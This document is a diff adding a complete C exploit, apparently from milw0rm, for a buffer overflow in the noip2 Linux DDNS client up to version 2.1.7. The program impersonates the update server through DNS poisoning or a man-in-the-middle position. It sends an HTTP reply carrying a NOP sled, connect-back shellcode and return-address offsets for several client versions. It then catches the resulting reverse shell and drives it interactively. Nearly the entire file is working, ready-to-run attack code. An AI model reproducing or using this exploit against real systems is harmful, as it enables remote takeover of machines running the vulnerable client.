@@ -1,0 +1,276 @@
+/*
+     _  __                 __  ___      __       
+    | |/ /__  ____  ____  /  |/  /_  __/ /_____ _
+    |   / _ \/ __ \/ __ \/ /|_/ / / / / __/ __ `/
+   /   /  __/ / / / /_/ / /  / / /_/ / /_/ /_/ / 
+  /_/|_\___/_/ /_/\____/_/  /_/\__,_/\__/\__,_/  
+
+  xenomuta [ arroba ] phreaker [ punto ] net
+  http://xenomuta.tuxfamily.org/ - Methylxantina 256mg
+
+  Permlink:
+  http://xenomuta.tuxfamily.org/exploits/noIPwn3r.c
+  
+  ** noIPwn3r **
+  Exploit 0-day para el cliente DDNS noip-2.1.7 de linux 
+
+  Vulnerable: noip2-Linux <= 2.1.7 
+  probado v.s. la version pre-compilada del cliente en
+  Ubuntu 7.10, Slackware 10.2 y Centos 4.5
+
+  probablemente la version 64bits tambien es vulnerable.
+
+  El programador confia a ciegas en la respuesta del servidor
+  y plago el codigo de variables estaticas sin chequeo de size...
+  Con un DNS envenenado o MITM podemos darle mambo.
+
+  saludos a:
+   4rd3b4r4n, kakata, garay, str0ke y fr1t0l4y
+
+*/
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <fcntl.h>
+#include <assert.h>
+
+#define HTTP_OK "HTTP/1.1 200 OK\r\n\r\n"
+#define NOIP_PORT 8245
+#define u_char unsigned char
+
+/* Offsets del shellcode x version
+*  ( ubicalo aproximado con gdb, info addr buffer+32 )
+*/
+struct OFFSET {
+	char ver[7];
+	u_char offset[4];
+	int padding;
+} victima[] = {
+	"custom", "\xff\xff\xff\xff", 162,
+	"2.1.7", "\x5d\x1f\x05\x08", 162,
+	"2.1.3", "\x5f\x12\x05\x08", 162,
+	"2.1.1", "\xdd\x14\x05\x08", 138,
+	"\x00", "\x00", 0 };
+
+
+/* Una cacarita pa que rebale por si acaso */
+char guineo[] =
+	"\x90\x90\x90\x90\x90\x90\x90\x90" 
+	"\x90\x90\x90\x90\x90\x90\x90\x90"
+	"\x90\x90\x90\x90\x90\x90\x90\x90" 
+	"\x90\x90\x90\x90\x90\x90\x90\x90";
+
+char shellcode[] =
+// Connect-back IP:puerto - Creditos para izik de tty64.org
+	"\xb0\x17\x31\xdb\xcd\x80\x6a\x66"
+	"\x58\x99\x6a\x01\x5b\x52\x53\x6a"
+	"\x02\x89\xe1\xcd\x80\x5b\x5d\xbe"
+	"\x80\xff\xff\xfe\xf7\xd6\x56\x66"
+	"\xbd\x69\x7a\x0f\xcd\x09\xdd\x55"
+	"\x43\x6a\x10\x51\x50\xb0\x66\x89"
+	"\xe1\xcd\x80\x87\xd9\x5b\xb0\x3f"
+	"\xcd\x80\x49\x79\xf9\xb0\x0b\x52"
+	"\x68\x2f\x2f\x73\x68\x68\x2f\x62"
+	"\x69\x6e\x89\xe3\x52\x53\xeb\xdf";
+
+int uso () {
+ fprintf(stderr, "Uso:\n ./noIPwn3r <ip escucha> <puerto escucha> [ 0xOFFSET ]\n\n");
+ fprintf(stderr, " Especifique el IP y puerto donde desea el shell reverso\n");
+ fprintf(stderr, " Puede usar un Offset arbitrario,\n - ejemplo: 0x08050c20 para la version 2.1.1 compilada en Redhat con gcc 3.4.6-9\n" );
+ fprintf(stderr, " Si no asigna el offset se usaran los de las versiones oficiales pre-compiladas.\n\n");
+ return -1;
+}
+
+void revshell(int sock, char *ip) {
+	char *buf;
+	int flags, i;
+	long l;
+	
+	buf = (char *)malloc(1024);
+	
+	for (i = 0; i <= sock; i++) {
+		flags = fcntl(i,F_GETFL,0);
+		assert(flags != -1);
+		fcntl(i, F_SETFL, flags | O_NONBLOCK);		
+	}
+	
+	while (1) {
+		memset(buf, 0, 1024);
+		if ((buf[0] = getchar()) > 0) {
+			if ((send(sock, buf, strlen(buf), 0)) < 1) {
+				break;
+			}
+		}
+
+		memset(buf, 0, 1024);		
+		if (recv(sock, buf, 1024, 0) > 0) { 
+			write(1, buf, strlen(buf), 0);
+			fflush(stdout);
+			i = 1;
+		} else if (i) {
+			i = 0;
+			printf("\nnoIPwn3r@%s$ ", ip);
+			fflush(stdout);
+		}
+	}
+	printf ("\n-= ADIOS =-\n");
+	return;
+}
+
+
+int main (int argc, char **argv) {
+	char *xploit, *ver, *hexmap;
+ 	u_char custom[4];
+	int i, v = 0, port;
+
+	// Payola 
+	printf("\n noIPwn3r - xploit para noip-2.1.x linux\n");
+	printf("     _  __                 __  ___      __\n");
+	printf("    | |/ /__  ____  ____  /  |/  /_  __/ /_____ _\n");
+	printf("    |   / _ \\/ __ \\/ __ \\/ /|_/ / / / / __/ __ `/\n");
+	printf("   /   /  __/ / / / /_/ / /  / / /_/ / /_/ /_/ / \n");
+	printf("  /_/|_\\___/_/ /_/\\____/_/  /_/\\__,_/\\__/\\__,_/\n\n");
+	printf("  http://xenomuta.tuxfamily.org - xenomuta%cphreaker.net\n\n", '@');
+
+	if (argc < 3)
+		return uso();
+
+	memset(custom, 0, 4);
+	if (argv[3]) {
+		if ((strlen(argv[3]) < 10) || (strncmp(argv[3],"0x", 2)))
+			return fprintf(stderr, "Offset Invalido. Utilize el formato 0x<HEX x 8>\n");
+
+		hexmap = (char *)malloc(16);
+		memset(hexmap, 0, 16);
+		strcpy(hexmap, "0123456789ABCDEFabcdef");
+		for (i = 2; i < 10; i++)
+			if (!strchr(hexmap, argv[3][i]))
+				return fprintf(stderr, "Offset Invalido. Utilize el formato 0x<HEX x 8>\n");
+		for (i = 0; i < 4; i++) {
+			custom[i] = (strchr(hexmap, (argv[3][8-(2*i)] >= 0x61)?argv[3][8-(2*i)] - 32:argv[3][8-(2*i)]) - hexmap) * 16;
+			custom[i] += (strchr(hexmap, (argv[3][9-(2*i)] >= 0x61)?argv[3][9-(2*i)] - 32:argv[3][9-(2*i)]) - hexmap);
+		}
+		strncpy((char *)&victima[0].offset, (char *)&custom, 4);
+	}
+
+	port = atoi(argv[2]);
+	if ((port < 0)||(port>65535))
+		return fprintf(stderr, "ERROR: puerto debe ser >= 1 <= 65535\n");
+
+	// sockets servidor / cliente
+	int s, c, len = 16, on = 1;	
+	struct sockaddr_in sa, ca; 
+
+	sa.sin_addr.s_addr = 0;
+	sa.sin_port = htons(NOIP_PORT);
+	sa.sin_family = AF_INET;
+	s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+	setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on));
+
+	if (bind(s, (struct sockaddr *)&sa, len)) {
+		fprintf(stderr, "ERROR: bind()\n");
+		exit(-1);
+	}
+	if (listen(s, 5)) {
+		fprintf(stderr, "ERROR: listen()\n");
+		exit(-1);
+	}
+	
+	// Una IP random cualquiera para forzar el cliente a hacer un update
+	printf("* Esperando que pregunte cual es su IP...");
+	fflush(stdout);
+	c = accept(s, (struct sockaddr *)&ca, (socklen_t *)&len);
+	printf("OK:\n  - Conexion desde %s:%d\n\n", inet_ntoa(ca.sin_addr), ca.sin_port);
+
+	xploit = (char *)malloc(1024); memset(xploit, 0, 1024);
+	sprintf(xploit, "%s1.2.%d.%d", HTTP_OK, ((getpid() << 16)%254), (getpid()%254));
+
+	// Averigua la version del Cliente
+	ver = (char *)malloc(1024);
+	memset(ver, 0, 1024);
+	recv(c, ver, 1024, 0);
+
+	if (!(ver = strstr(ver, "/2") + 1)) {	// User-Agent: Linux-DUC/2.X.X
+		close(c);
+		close(s);
+		return fprintf(stderr, "\nERROR: Veriosn no encontrada\n");
+	}
+	
+	memset(ver+5, 0, 1);
+	
+	// Busca los offset de esta version
+	for (v = 0; (!argv[3]) && strlen(victima[v].ver); v++)
+		if(!strcmp(victima[v].ver, ver)) break;
+
+	if (!victima[v].ver) {
+		close(c);
+		close(s);
+		return fprintf(stderr, "\nERROR: Veriosn no encontrada\n");
+	}
+
+	send(c, xploit, strlen(xploit), 0);
+	close(c);
+
+	// Ahora el fuetazo   >;)
+	printf("* Preparando Exploit v.s. %s @ ", ver);	
+	printf("0x%02x%02x%02x%02x\n", victima[v].offset[3], victima[v].offset[2], victima[v].offset[1], victima[v].offset[0]);
+
+	// Setea el puerto en el Shellcode
+	shellcode[34] = (char )((port >> 8) & 0xff);
+	shellcode[33] = (char )(port & 0xff);
+
+	// Setea la IP de retorno en el Shellcode
+	unsigned long backip = (inet_addr(argv[1]) ^ 0xffffffff);
+	*(unsigned long *)(((shellcode)+24)) = (backip);
+
+	// Prepara el HTTP reply	
+	memset(xploit, 0, 1024);
+	sprintf(xploit, "%s<domain =:%s%s", HTTP_OK, guineo, shellcode);
+
+	// Completa con basura pal' relleno
+	for (i = 0; i < victima[v].padding; i++)
+		strcat(xploit, "\x41"); 
+
+	// Finalmente, trukeame el %EIP
+	strcat(xploit, (char *)&victima[v].offset);
+	
+	printf("* Esperando la conexion de update...");
+	fflush(stdout);
+	c = accept(s, (struct sockaddr *)&ca, (socklen_t *)&len);
+	printf("OK:\n  - Conexion desde %s:%d\n\n", inet_ntoa(ca.sin_addr), ca.sin_port);
+	send(c, xploit, strlen(xploit), 0);
+	close(c);
+	close(s);
+	printf("* Exploit Enviado!!\n\n");
+
+	sa.sin_addr.s_addr = 0;
+	sa.sin_port = htons(port);
+	sa.sin_family = AF_INET;
+	s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+	setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &on, sizeof(on));
+
+	if (bind(s, (struct sockaddr *)&sa, len)) {
+		fprintf(stderr, "ERROR: bind()\n");
+		exit(-1);
+	}
+	if (listen(s, 5)) {
+		fprintf(stderr, "ERROR: listen()\n");
+		exit(-1);
+	}
+	
+	// Una IP random cualquiera para forzar el cliente a hacer un update
+	printf("* Esperando el shell en %s:%d: ", argv[1], port);
+	fflush(stdout);
+	c = accept(s, (struct sockaddr *)&ca, (socklen_t *)&len);
+	// dup2 y NONBLOCK
+	printf("OK:\n  - Conexion desde %s:%d\n\n", inet_ntoa(ca.sin_addr), ca.sin_port);
+	printf("noIPwn3d!!!!\n\n", inet_ntoa(ca.sin_addr), ca.sin_port);
+	revshell(c, inet_ntoa(ca.sin_addr));
+	close(c);
+	close(s);
+}
+
+// milw0rm.com [2008-11-18]
